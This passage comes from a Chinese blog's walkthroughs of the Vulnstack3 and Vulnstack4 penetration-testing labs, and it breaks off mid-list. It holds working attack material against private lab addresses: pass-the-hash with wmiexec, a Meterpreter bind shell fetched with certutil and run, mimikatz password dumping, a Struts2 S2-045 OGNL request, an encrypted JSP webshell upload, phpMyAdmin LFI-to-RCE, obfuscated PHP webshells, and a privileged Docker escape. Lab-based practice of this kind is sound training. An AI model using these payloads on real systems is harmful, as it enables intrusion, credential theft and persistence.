<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="function">Administrator:500:<span class="title">aad3b435b51404eeaad3b435b51404ee</span>:31<span class="title">c1794c5aa8547c87a8bcd0324b8337</span>:::</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/60932dea1a09ff9bf41bfd506003640e.png" alt="img"></p>
<p>然后就可以用wmiexec来连接到93.20</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"># git clone https://github.com/SecureAuthCorp/impacket</span><br><span class="line"># <span class="built_in">cd</span> impacket/ &amp;&amp; python3 -m pip install .</span><br><span class="line"></span><br><span class="line"># NTLM Hash</span><br><span class="line">$ proxychains4 python3 wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:<span class="number">31</span>c1794c5aa8547c87a8bcd0324b8337 administrator@<span class="number">192</span>.<span class="number">168</span>.<span class="number">93</span>.<span class="number">20</span></span><br><span class="line"></span><br><span class="line"># 明文密码</span><br><span class="line">$ proxychains4 python3 wmiexec.py &#x27;administrator:<span class="number">123</span>qwe!ASD@<span class="number">192</span>.<span class="number">168</span>.<span class="number">93</span>.<span class="number">20</span>&#x27;</span><br></pre></td></tr></table></figure>

<p>这里还是照着答案测了一下，终于拿下了一个windows服务器😭</p>
<p><img src="/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220715221055341.png" alt="image-20220715221055341"></p>
<h3 id="攻域控"><a href="#攻域控" class="headerlink" title="攻域控"></a>攻域控</h3><h4 id="方式一"><a href="#方式一" class="headerlink" title="方式一"></a>方式一</h4><blockquote>
<p>未知Win2008明文密码，使用NTLM Hash通过WMI连接到Win2008，然后获取正向Shell，通过进程迁移提权后读取文件</p>
</blockquote>
<p>MSF生成一个正向shell木马，并开启监听</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">$ msfvenom -p windows/meterpreter/bind_tcp -f exe -o bind.exe</span><br><span class="line"></span><br><span class="line">msf6&gt; use exploit/multi/handler </span><br><span class="line">msf6&gt; <span class="built_in">set</span> PAYLOAD windows/meterpreter/bind_tcp</span><br><span class="line">msf6&gt; <span class="built_in">set</span> RHOST <span class="number">192</span>.<span class="number">168</span>.<span class="number">93</span>.<span class="number">20</span></span><br><span class="line">msf6&gt; <span class="built_in">set</span> LPORT <span class="number">5555</span></span><br><span class="line">msf6&gt; exploit</span><br></pre></td></tr></table></figure>

<p>然后将生成的正向马传到93.100上（这里利用scp上传），并在93.100上开启http服务</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"># kali中ssh连接配置</span><br><span class="line"># vim /root/.ssh/config</span><br><span class="line"># Host *</span><br><span class="line"># HostkeyAlgorithms +ssh-rsa</span><br><span class="line"># PubkeyAcceptedKeyTypes +ssh-rsa</span><br><span class="line"></span><br><span class="line">$ scp bind.exe wwwuser@<span class="number">192</span>.<span class="number">168</span>.<span class="number">184</span>.<span class="number">137</span>:/tmp/</span><br><span class="line"># wwwuser_123Aqx</span><br><span class="line"></span><br><span class="line">$ python3 -m http.server <span class="number">8080</span></span><br></pre></td></tr></table></figure>

<p>然后通过之间WMI连接的93.20的shell，下载传到93.100上bind.exe马，并执行</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">$ proxychains4 python3 wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:<span class="number">31</span>c1794c5aa8547c87a8bcd0324b8337 administrator@<span class="number">192</span>.<span class="number">168</span>.<span class="number">93</span>.<span class="number">20</span></span><br><span class="line"></span><br><span class="line">$ certutil -urlcache -split -f http://<span class="number">192</span>.<span class="number">168</span>.<span class="number">93</span>.<span class="number">100</span>:<span class="number">8080</span>/bind.exe </span><br><span class="line">$ bind.exe</span><br></pre></td></tr></table></figure>

<p><img src="/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220715224132571.png" alt="image-20220715224132571"></p>
<p>上线之后执行<code>ps</code>，发现存在域管用户的进程，进程迁移</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">meterpreter&gt; ps</span><br><span class="line">meterpreter&gt; migrate <span class="number">3800</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220715224352593.png" alt="image-20220715224352593"></p>
<p>迁移成功</p>
<p><img src="/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220715224749412.png" alt="image-20220715224749412"></p>
<p>接下来就可以读取域控的文件了</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">type</span> \\<span class="number">192</span>.<span class="number">168</span>.<span class="number">93</span>.<span class="number">10</span>\C$\Users\Administrator\Documents\flag.txt</span><br></pre></td></tr></table></figure>

<p><img src="/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220715224926271.png" alt="image-20220715224926271"></p>
<h4 id="方式二"><a href="#方式二" class="headerlink" title="方式二"></a>方式二</h4><blockquote>
<p>已知Win2008明文密码，使用mimikatz抓取域管密码，然后通过IPC连接域控读取文件</p>
</blockquote>
<p>上传mimikatz。使用<code>smbclient</code>连接并上传</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">$ proxychains4 smbclient -L <span class="number">192</span>.<span class="number">168</span>.<span class="number">93</span>.<span class="number">20</span> -U administrator</span><br><span class="line">$ proxychains4 smbclient //<span class="number">192</span>.<span class="number">168</span>.<span class="number">93</span>.<span class="number">20</span>/ADMIN$ -U administrator</span><br><span class="line">$ put mimikatz.exe</span><br></pre></td></tr></table></figure>

<p><img src="/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220715230004656.png" alt="image-20220715230004656"></p>
<p>执行mimikatz，获得<code>TEST\administrator</code>密码：<code>zxcASDqw123!</code></p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> c:/windows</span><br><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;log&quot; &quot;sekurlsa::logonpasswords&quot; &quot;<span class="keyword">exit</span>&quot; &gt; pwd.log</span><br><span class="line"><span class="built_in">type</span> pwd.log</span><br></pre></td></tr></table></figure>

<p><img src="/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220715230259643.png" alt="image-20220715230259643"></p>
<p>最后IPC连接到域控读取文件</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">net</span> use \\<span class="number">192</span>.<span class="number">168</span>.<span class="number">93</span>.<span class="number">10</span>\admin$ zxcASDqw123!! /user:test\administrator</span><br><span class="line">$ <span class="built_in">type</span> \\<span class="number">192</span>.<span class="number">168</span>.<span class="number">93</span>.<span class="number">10</span>\C$\users\administrator\Documents\flag.txt</span><br></pre></td></tr></table></figure>

<p><img src="/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220715230516432.png" alt="image-20220715230516432"></p>
<p>获得密码后其实这里可以用之前的方法，用WMI直接登录上域控93.10</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">proxychains4 python3 wmiexec.py &#x27;administrator:zxcASDqw123!!@<span class="number">192</span>.<span class="number">168</span>.<span class="number">93</span>.<span class="number">10</span>&#x27;</span><br></pre></td></tr></table></figure>

<p><img src="/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220715230812938.png" alt="image-20220715230812938"></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://cloud.tencent.com/developer/article/1942868">Vulnstack3</a></p>
<p><a href="https://xz.aliyun.com/t/6988#toc-4">Vlunstack ATT&amp;CK实战系列——红队实战（三）Writeup</a></p>
<p><a href="https://www.freebuf.com/articles/network/263069.html">记一次Vulnstack靶场内网渗透（四）</a></p>
<p><a href="https://v0w.top/2020/03/14/mysql-getshell/#0x00-%E5%89%8D%E8%A8%80">mysql写shell的一点总结</a></p>
<p><a href="https://www.freebuf.com/articles/network/263069.html">记一次Vulnstack靶场内网渗透（四）</a></p>
<p><a href="https://blog.csdn.net/shang_0122/article/details/114820532">nginx正向和反向代理的区别</a>–<strong>本质上代理服务器还是那个代理服务器,如果替客户端干活就是正向代理,如果替服务端干活就是反向代理</strong></p>
<p><a href="https://blog.csdn.net/weixin_45630258/article/details/124976564">Nginx 反向代理+负载均衡</a></p>
<p><a href="https://blog.csdn.net/qq_43038960/article/details/125591755">代理、正向代理与反向代理</a></p>
<p><a href="https://blog.csdn.net/tryheart/article/details/108245986">nmap 常用参数</a></p>
<p><a href="https://wenku.baidu.com/view/ae5cca240722192e4536f64a.html">nmap命令使用详细解释</a></p>
<h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><p><a href="https://www.openssl.org/source/openssl-1.1.1g.tar.gz">OpenSSL</a></p>
<p><a href="https://www.python.org/ftp/python/3.6.9/Python-3.6.9.tgz">Python3</a></p>
<p><a href="https://github.com/lgandx/Responder">Responder</a></p>
<p><a href="https://github.com/SecureAuthCorp/impacket">impacket</a></p>
]]></content>
      <categories>
        <category>内网安全</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>内网安全，vulnstack</tag>
        <tag>域渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>Vulnstack4靶场内网渗透</title>
    <url>/2022/07/16/Vulnstack4%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/</url>
    <content><![CDATA[<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><blockquote>
<p><strong>机器密码</strong></p>
<ul>
<li><strong>web(Ubuntu)：</strong>ubuntu:ubuntu</li>
<li><strong>域成员账号：</strong>douser:Dotest123</li>
<li><strong>域管账号：</strong>administrator:Test2022</li>
</ul>
<p>这里域管密码我改了，因为原来的密码过期了，后面mimikatz抓不到密码</p>
</blockquote>
<p>需要添加一张192.168.183.0/24网段的内网网卡</p>
<p><img src="/2022/07/16/Vulnstack4%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220716114734710.png" alt="image-20220716114734710"></p>
<p>若是kali用的Nat模式这里不要勾选“将主机虚拟适配器连接到此网络”，若是桥接模式则勾选</p>
<p>ubuntu这台web服务器利用docker开启web服务</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"># 启动docke容器</span><br><span class="line"><span class="built_in">cd</span> /home/ubuntu/Desktop/vulhub/struts2/s2-<span class="number">045</span></span><br><span class="line">sudo docker-compose up -d</span><br><span class="line"><span class="built_in">cd</span> /home/ubuntu/Desktop/vulhub/tomcat/CVE-<span class="number">2017</span>-<span class="number">12615</span>/</span><br><span class="line">sudo docker-compose up -d</span><br><span class="line"><span class="built_in">cd</span> /home/ubuntu/Desktop/vulhub/phpmyadmin/CVE-<span class="number">2018</span>-<span class="number">12613</span>/</span><br><span class="line">sudo docker-compose up -d</span><br><span class="line"></span><br><span class="line"># 查看运行的docker容器</span><br><span class="line">sudo docker ps -a</span><br></pre></td></tr></table></figure>



<p>win7总是自动挂起</p>
<p>进入控制面板 → 硬件和声音 → 更改计算机休眠时间 （改为从不休眠）</p>
<h2 id="拓扑图"><a href="#拓扑图" class="headerlink" title="拓扑图"></a>拓扑图</h2><p><img src="/2022/07/16/Vulnstack4%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220719110838382.png" alt="image-20220719110838382"></p>
<h2 id="打靶"><a href="#打靶" class="headerlink" title="打靶"></a>打靶</h2><p>老样子先用nmap对192.168.184.0/24网段进行端口扫描<code>nmap -sV 192.168.184.0/24</code></p>
<p>在192.168.184.139这台主机发现三个web服务</p>
<p><img src="/2022/07/16/Vulnstack4%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220716164723466.png" alt="image-20220716164723466"></p>
<p>接下来来对这三个服务一次访问并通过这三个web服务不同路径获取该外网主机权限</p>
<h3 id="外网打点"><a href="#外网打点" class="headerlink" title="外网打点"></a>外网打点</h3><h4 id="S2-045"><a href="#S2-045" class="headerlink" title="S2-045"></a>S2-045</h4><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"># EXP抓上传的包，修改Content-<span class="built_in">Type</span>的值</span><br><span class="line">POST / HTTP/<span class="number">1</span>.<span class="number">1</span></span><br><span class="line"><span class="function">Host: 192.168.184.139:2001</span></span><br><span class="line"><span class="function"><span class="title">User</span>-<span class="title">Agent</span>: <span class="title">Mozilla</span>/5.0 (<span class="title">Windows</span> <span class="title">NT</span> 10.0; <span class="title">Win64</span>; <span class="title">x64</span>; <span class="title">rv</span>:100.0) <span class="title">Gecko</span>/20100101 <span class="title">Firefox</span>/100.0</span></span><br><span class="line"><span class="function"><span class="title">Accept</span>: <span class="title">text</span>/<span class="title">html</span>,<span class="title">application</span>/<span class="title">xhtml</span>+<span class="title">xml</span>,<span class="title">application</span>/<span class="title">xml</span>;<span class="title">q</span>=0.9,<span class="title">image</span>/<span class="title">avif</span>,<span class="title">image</span>/<span class="title">webp</span>,*/*;<span class="title">q</span>=0.8</span></span><br><span class="line"><span class="function"><span class="title">Accept</span>-<span class="title">Language</span>: <span class="title">zh</span>-<span class="title">CN</span>,<span class="title">zh</span>;<span class="title">q</span>=0.8,<span class="title">zh</span>-<span class="title">TW</span>;<span class="title">q</span>=0.7,<span class="title">zh</span>-<span class="title">HK</span>;<span class="title">q</span>=0.5,<span class="title">en</span>-<span class="title">US</span>;<span class="title">q</span>=0.3,<span class="title">en</span>;<span class="title">q</span>=0.2</span></span><br><span class="line"><span class="function"><span class="title">Accept</span>-<span class="title">Encoding</span>: <span class="title">gzip</span>, <span class="title">deflate</span></span></span><br><span class="line"><span class="function"><span class="title">Content</span>-<span class="title">Type</span>: &quot;%&#123;(#<span class="title">nike</span>=&#x27;<span class="title">multipart</span>/<span class="title">form</span>-<span class="title">data</span>&#x27;).(#<span class="title">dm</span>=@<span class="title">ognl.OgnlContext</span>@<span class="title">DEFAULT_MEMBER_ACCESS</span>).(#<span class="title">_memberAccess</span>?(#<span class="title">_memberAccess</span>=#<span class="title">dm</span>):((#<span class="title">container</span>=#<span class="title">context</span>[&#x27;<span class="title">com.opensymphony.xwork2.ActionContext.container</span>&#x27;]).(#<span class="title">ognlUtil</span>=#<span class="title">container.getInstance</span>(@<span class="title">com.opensymphony.xwork2.ognl.OgnlUtil</span>@<span class="title">class</span>)).(#<span class="title">ognlUtil.getExcludedPackageNames</span>().<span class="title">clear</span>()).(#<span class="title">ognlUtil.getExcludedClasses</span>().<span class="title">clear</span>()).(#<span class="title">context.setMemberAccess</span>(#<span class="title">dm</span>)))).(#<span class="title">cmd</span>=&#x27;<span class="title">whoami</span>&#x27;).(#<span class="title">iswin</span>=(@<span class="title">java.lang.System</span>@<span class="title">getProperty</span>(&#x27;<span class="title">os.name</span>&#x27;).<span class="title">toLowerCase</span>().<span class="title">contains</span>(&#x27;<span class="title">win</span>&#x27;))).(#<span class="title">cmds</span>=(#<span class="title">iswin</span>?&#123;&#x27;<span class="title">cmd.exe</span>&#x27;,&#x27;/<span class="title">c</span>&#x27;,#<span class="title">cmd</span>&#125;:&#123;&#x27;/<span class="title">bin</span>/<span class="title">bash</span>&#x27;,&#x27;-<span class="title">c</span>&#x27;,#<span class="title">cmd</span>&#125;)).(#<span class="title">p</span>=<span class="title">new</span> <span class="title">java.lang.ProcessBuilder</span>(#<span class="title">cmds</span>)).(#<span class="title">p.redirectErrorStream</span>(<span class="title">true</span>)).(#<span class="title">process</span>=#<span class="title">p.start</span>()).(#<span class="title">ros</span>=(@<span class="title">org.apache.struts2.ServletActionContext</span>@<span class="title">getResponse</span>().<span class="title">getOutputStream</span>())).(@<span class="title">org.apache.commons.io.IOUtils</span>@<span class="title">copy</span>(#<span class="title">process.getInputStream</span>(),#<span class="title">ros</span>)).(#<span class="title">ros.flush</span>())&#125;&quot;</span></span><br><span class="line"><span class="function"><span class="title">Content</span>-<span class="title">Length</span>: 0</span></span><br><span class="line"><span class="function"><span class="title">Origin</span>: <span class="title">http</span>://192.168.184.139:2001</span></span><br><span class="line"><span class="function"><span class="title">Connection</span>: <span class="title">close</span></span></span><br><span class="line"><span class="function"><span class="title">Referer</span>: <span class="title">http</span>://192.168.184.139:2001/<span class="title">doUpload.action</span></span></span><br><span class="line"><span class="function"><span class="title">Cookie</span>: <span class="title">JSESSIONID</span>=1<span class="title">d6q15kddtb1z136edkhjwibnl</span>; <span class="title">phpMyAdmin</span>=4<span class="title">faf82614b1631c025eb550defea0d14</span>; <span class="title">pma_lang</span>=<span class="title">zh_CN</span></span></span><br><span class="line"><span class="function"><span class="title">Upgrade</span>-<span class="title">Insecure</span>-<span class="title">Requests</span>: 1</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/07/16/Vulnstack4%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220716172351451.png" alt="image-20220716172351451"></p>
<h5 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h5><p>留坑</p>
<h4 id="tomcat-PUT上传-CVE-2017-12615"><a href="#tomcat-PUT上传-CVE-2017-12615" class="headerlink" title="tomcat PUT上传(CVE-2017-12615)"></a>tomcat PUT上传(CVE-2017-12615)</h4><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"># EXP</span><br><span class="line">PUT /tomcat.jsp/ HTTP/<span class="number">1</span>.<span class="number">1</span></span><br><span class="line"><span class="function">Host: <span class="title">your</span>-<span class="title">ip</span>:8080</span></span><br><span class="line"><span class="function"><span class="title">Accept</span>: */*</span></span><br><span class="line"><span class="function"><span class="title">Accept</span>-<span class="title">Language</span>: <span class="title">en</span></span></span><br><span class="line"><span class="function"><span class="title">User</span>-<span class="title">Agent</span>: <span class="title">Mozilla</span>/5.0 (<span class="title">compatible</span>; <span class="title">MSIE</span> 9.0; <span class="title">Windows</span> <span class="title">NT</span> 6.1; <span class="title">Win64</span>; <span class="title">x64</span>; <span class="title">Trident</span>/5.0)</span></span><br><span class="line"><span class="function"><span class="title">Connection</span>: <span class="title">close</span></span></span><br><span class="line"><span class="function"><span class="title">Content</span>-<span class="title">Type</span>: <span class="title">application</span>/<span class="title">x</span>-<span class="title">www</span>-<span class="title">form</span>-<span class="title">urlencoded</span></span></span><br><span class="line"><span class="function"><span class="title">Content</span>-<span class="title">Length</span>: 572</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">&lt;%@<span class="title">page</span> <span class="title">import</span>=&quot;<span class="title">java.util</span>.*,<span class="title">javax.crypto</span>.*,<span class="title">javax.crypto.spec</span>.*&quot;%&gt;&lt;%!<span class="title">class</span> <span class="title">U</span> <span class="title">extends</span> <span class="title">ClassLoader</span>&#123;<span class="title">U</span>(<span class="title">ClassLoader</span> <span class="title">c</span>)&#123;<span class="title">super</span>(<span class="title">c</span>);&#125;<span class="title">public</span> <span class="title">Class</span> <span class="title">g</span>(<span class="title">byte</span> []<span class="title">b</span>)&#123;<span class="title">return</span> <span class="title">super.defineClass</span>(<span class="title">b</span>,0,<span class="title">b.length</span>);&#125;&#125;%&gt;&lt;%<span class="title">if</span> (<span class="title">request.getMethod</span>().<span class="title">equals</span>(&quot;<span class="title">POST</span>&quot;))&#123;<span class="title">String</span> <span class="title">k</span>=&quot;<span class="title">e45e329feb5d925b</span>&quot;;/*åÆ¥:Þ¥Æ32<span class="title">Mmd5</span>&lt;<span class="title">M16M</span>Ø¤Þ¥Æ<span class="title">rebeyond</span>*/<span class="title">session.putValue</span>(&quot;<span class="title">u</span>&quot;,<span class="title">k</span>);<span class="title">Cipher</span> <span class="title">c</span>=<span class="title">Cipher.getInstance</span>(&quot;<span class="title">AES</span>&quot;);<span class="title">c.init</span>(2,<span class="title">new</span> <span class="title">SecretKeySpec</span>(<span class="title">k.getBytes</span>(),&quot;<span class="title">AES</span>&quot;));<span class="title">new</span> <span class="title">U</span>(<span class="title">this.getClass</span>().<span class="title">getClassLoader</span>()).<span class="title">g</span>(<span class="title">c.doFinal</span>(<span class="title">new</span> <span class="title">sun.misc.BASE64Decoder</span>().<span class="title">decodeBuffer</span>(<span class="title">request.getReader</span>().<span class="title">readLine</span>()))).<span class="title">newInstance</span>().<span class="title">equals</span>(<span class="title">pageContext</span>);&#125;%&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/07/16/Vulnstack4%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220716173303485.png" alt="image-20220716173303485"></p>
<h5 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h5><p>留坑</p>
<h4 id="phpmyadmin文件包含-CVE-2018-12613"><a href="#phpmyadmin文件包含-CVE-2018-12613" class="headerlink" title="phpmyadmin文件包含(CVE-2018-12613)"></a>phpmyadmin文件包含(CVE-2018-12613)</h4><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"># POC</span><br><span class="line"><span class="function">http://192.168.184.139:2003//<span class="title">index.php</span>?<span class="title">target</span>=<span class="title">db_sql.php</span>%253<span class="title">f</span>/../../../../../../../../<span class="title">etc</span>/<span class="title">passwd</span></span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/07/16/Vulnstack4%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220716205700320.png" alt="image-20220716205700320"></p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"># EXP</span><br><span class="line"># 在http://<span class="number">192</span>.<span class="number">168</span>.<span class="number">184</span>.<span class="number">139</span>:<span class="number">2003</span>/server_sql.php页面写入SELECT &quot;&lt;?=system(&#x27;whoami&#x27;);?&gt;&quot;</span><br><span class="line"># 会保存到/tmp/sess_[Cookie中phpMyadmin的值]</span><br><span class="line"># Payload如下</span><br><span class="line"><span class="function">http://192.168.184.139:2003/<span class="title">index.php</span>?<span class="title">target</span>=<span class="title">db_sql.php</span>%253<span class="title">f</span>/../../../../../../../<span class="title">tmp</span>/<span class="title">sess_2b513185c9f040cae084bc2d6b5f79a9</span></span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/07/16/Vulnstack4%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220716210209265.png" alt="image-20220716210209265"></p>
<p>上面勉强用system()函数命令执行成功，但我还是想让蚁剑能连上，于是有了接下来的一番折腾</p>
<p>由于我最开始尝试直接传<code>&lt;?php eval($_POST[cmd]);?&gt;</code>，但并没有成功连上蚁剑，怀疑可能是被杀了吧</p>
<p>接着尝试<code>&lt;?php assert($_POST[cmd]);?&gt;</code>，这回直接报错</p>
<p><img src="/2022/07/16/Vulnstack4%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220717122731632.png" alt="image-20220717122731632"></p>
<p>在查了网上资料后结论是，PHP7.0及之前的版本都可以执行，但是之后的版本就<strong>不允许</strong>在assert()函数中传入<strong>可变字符串</strong>了</p>
<p>但我看到一篇文章<a href="https://www.freebuf.com/articles/network/244704.html">记一次Vulnstack靶场内网渗透（二） - FreeBuf网络安全行业门户</a>，这个作者就是用的assert成功连上蚁剑的，他用的免杀马如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$p</span> = <span class="keyword">array</span>(<span class="string">&#x27;f&#x27;</span>=&gt;<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;pffff&#x27;</span>=&gt;<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;e&#x27;</span>=&gt;<span class="string">&#x27;fffff&#x27;</span>,<span class="string">&#x27;lfaaaa&#x27;</span>=&gt;<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;nnnnn&#x27;</span>=&gt;<span class="string">&#x27;t&#x27;</span>);<span class="variable">$a</span> = array_keys(<span class="variable">$p</span>);<span class="variable">$_</span>=<span class="variable">$p</span>[<span class="string">&#x27;pffff&#x27;</span>].<span class="variable">$p</span>[<span class="string">&#x27;pffff&#x27;</span>].<span class="variable">$a</span>[<span class="number">2</span>];<span class="variable">$_</span>= <span class="string">&#x27;a&#x27;</span>.<span class="variable">$_</span>.<span class="string">&#x27;rt&#x27;</span>;<span class="variable">$_</span>(base64_decode(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;whoami&#x27;</span>]));<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>我就纳闷他是怎么成功的，表示很不理解，现在只能把锅甩给docker环境有问题了</p>
<p>并且我还在本地测了一下，用它的马我也没成功，但是改了一下把base64_decode删了，在蚁剑编码器选择base64就能连，我就觉得更加玄学了，并且我用我改的去测靶机还是没有成功，要哭辣</p>
<p>这是这位作者的免杀给了我思路，之前eval没有成功，我能不能也像他一样做点混淆来绕过被杀</p>
<p>然而尝试过后并不可行，原因是<strong>eval()并不是函数，它是一个语言构造器，不能被可变函数调用</strong>，所以打咩</p>
<p>而且我还查到，<strong>assert() is a language construct in PHP 7</strong>，大写的一个G</p>
<p>在本地测试总结下来就是：<strong>eval()不能用可变函数调用，php7.1之后assert()也不能用可变函数调用，并且assert()7.1之后也不能用作一句话，但实际情况还是测一下万一能用</strong></p>
<p>但这里还有一个奇怪的点，记录一下</p>
<p>我在本地测试的时候，用的是PHP7.3.9，虽然直接使用assert()，<strong>会报不能用可变字符串的错但是能连上蚁剑</strong>（蚁剑编码器勾选base64）</p>
<p><img src="/2022/07/16/Vulnstack4%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220717125228664.png" alt="image-20220717125228664"></p>
<p>而且在浏览器上测都不用base64就能执行</p>
<p><img src="/2022/07/16/Vulnstack4%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220717125331910.png" alt="image-20220717125331910"></p>
<p>可以看到有报错，但是能执行太怪了，我已经晕了</p>
<h5 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h5><p><a href="https://www.freebuf.com/articles/web/278808.html">https://www.freebuf.com/articles/web/278808.html</a></p>
<p>这里有个疑问，上面链接的文章中说<strong>php会将前面的db_sql.php?当成目录</strong>，但我在本地测并没有成功，不知原因</p>
<h3 id="逃逸docker容器–privileged特权模式"><a href="#逃逸docker容器–privileged特权模式" class="headerlink" title="逃逸docker容器–privileged特权模式"></a>逃逸docker容器–privileged特权模式</h3><blockquote>
<p>使用特权模式启动容器，可以获取大量设备文件访问权限。因为当管理员执行docker run —privileged时，Docker容器将<strong>被允许访问主机上的所有设备</strong>，并可以执行mount命令进行挂载。</p>
<p>当控制使用特权模式启动的容器时，docker管理员可通过<strong>mount命令将外部宿主机磁盘设备挂载进容器内部</strong>，获取对整个宿主机的文件读写权限，此外还可以通过写入计划任务等方式在宿主机执行命令。</p>
</blockquote>
<p>这里查看docker启动的配置文件.yml发现只有tomcat这个容器是特权模式启动起来的</p>
<p><img src="/2022/07/16/Vulnstack4%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220717165347989.png" alt="image-20220717165347989"></p>
<p>其实通过看<code>ls /dev</code>也可以看出端倪，明显特权模式的设备更多</p>
<p><img src="/2022/07/16/Vulnstack4%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220717165258051.png" alt="image-20220717165258051"></p>
<p><img src="/2022/07/16/Vulnstack4%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220717165143713.png" alt="image-20220717165143713"></p>
<p><img src="/2022/07/16/Vulnstack4%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220717164420846.png" alt="image-20220717164420846"></p>
<p>所以接下来的操作都是基于tomcat这个docker容器完成</p>
<h4 id="姿势1：添加用户–来自白日梦组长"><a href="#姿势1：添加用户–来自白日梦组长" class="headerlink" title="姿势1：添加用户–来自白日梦组长"></a>姿势1：添加用户–来自白日梦组长</h4><blockquote>
<p>通过修改/etc/passwd和/etc/shadow文件</p>
<p>/dev/sd[a-z]：SCSI设备</p>
</blockquote>
<p>在根目录下创建一个目录名为hacker的文件夹，并将/dev/sda1挂载到该目录下，这是/hacker相当于就是物理主机的根目录了</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mkdir /hacker</span><br><span class="line">mount /dev/sda1 /hacker</span><br></pre></td></tr></table></figure>

<p><img src="/2022/07/16/Vulnstack4%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220717172258614.png" alt="image-20220717172258614"></p>
<p>（插一句，这里提权不能直接添加root用户，因为root用户没有远程登录权限，我们现在只是有对文件操作的权限，并不能重启ssh服务来修改配置，所以下面添加的是一个普通用户）</p>
<blockquote>
<p>PermitRootLogin 配置项都有哪些配置参数？</p>
<ul>
<li>yes</li>
<li>no</li>
